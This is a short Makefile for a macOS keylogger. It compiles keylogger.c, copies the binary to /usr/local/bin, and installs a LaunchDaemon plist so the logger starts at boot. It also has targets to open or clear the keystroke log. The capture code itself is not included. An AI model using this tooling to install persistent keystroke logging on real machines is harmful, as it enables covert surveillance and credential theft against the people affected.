LOGPATH = /var/log/keylogger.log
PLIST=keylogger.plist
LAUNCHPATH = /Library/LaunchDaemons
EXECUTABLE=keylogger
INSTALLDIR=/usr/local/bin

keylogger:
	gcc -Wall -o $(EXECUTABLE) keylogger.c -framework ApplicationServices

install: keylogger
	mkdir -p $(INSTALLDIR)
	cp $(EXECUTABLE) $(INSTALLDIR)

startup: install
	cp $(PLIST) $(LAUNCHPATH)
	launchctl load $(LAUNCHPATH)/$(PLIST)

uninstall:
	rm $(INSTALLDIR)/$(EXECUTABLE)
	rm $(LAUNCHPATH)/$(PLIST)

openlog:
	open $(LOGPATH)

clearlog:
	> $(LOGPATH)